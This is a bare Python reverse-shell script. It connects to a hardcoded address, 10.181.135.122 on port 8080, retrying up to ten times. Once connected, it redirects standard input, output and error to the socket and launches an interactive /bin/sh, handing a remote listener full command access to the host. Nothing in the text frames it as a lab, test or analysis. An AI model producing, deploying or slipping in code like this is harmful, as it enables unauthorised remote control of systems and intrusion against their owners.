from __future__ import print_function
import socket
import time
import os
import subprocess

IP = "10.181.135.122"
PORT = 8080

s = socket.socket()

connected = False

for i in range(10):
    if connected: break
    try:
        s.connect((IP, int(PORT)))
        connected = True
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        subprocess.call(["/bin/sh", "-i"])
        
    except Exception as E:
        time.sleep(1)
